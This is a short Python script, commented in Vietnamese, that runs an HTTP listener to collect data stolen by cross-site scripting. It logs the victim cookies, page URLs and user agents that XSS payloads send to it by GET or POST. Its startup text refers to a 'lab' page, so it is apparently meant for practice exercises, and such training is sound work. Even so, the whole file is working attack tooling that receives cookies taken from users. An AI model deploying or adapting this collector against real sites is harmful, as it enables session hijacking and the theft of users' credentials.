#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import datetime
import sys

class XSSHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Tắt log mặc định (chỉ hiện khi có XSS)
        return

    def do_GET(self):
        # Parse query string
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)

        # Lấy cookie & metadata
        cookie = params.get('c', [''])[0]
        url = params.get('u', [''])[0]
        ua = params.get('ua', [''])[0]

        # In kết quả đẹp, có màu (nếu terminal hỗ trợ)
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"\033[1;31m🔥 [{timestamp}] XSS TRIGGERED!\033[0m")
        print(f"   🍪 Cookie: \033[1;33m{cookie}\033[0m")
        if url:
            print(f"   🌐 URL: {url}")
        if ua:
            print(f"   🖥️  UA: {ua[:60]}{'...' if len(ua) > 60 else ''}")
        print("-" * 50)

        # Phản hồi đơn giản
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"OK")

    # Hỗ trợ cả POST (phòng khi dùng fetch POST)
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8', errors='ignore')
        print(f"\033[1;31m🔥 [POST] XSS Data:\033[0m\n{body}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

if __name__ == "__main__":
    port = 6969
    server = HTTPServer(("0.0.0.0", port), XSSHandler)
    print(f"🛡️  XSS Listener đang chờ tại: http://localhost:{port}")
    print("🚀 Gửi payload XSS vào trang lab — cookie sẽ xuất hiện ở đây!")
    print("-" * 50)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n⏹️  Dừng listener.")
        server.server_close()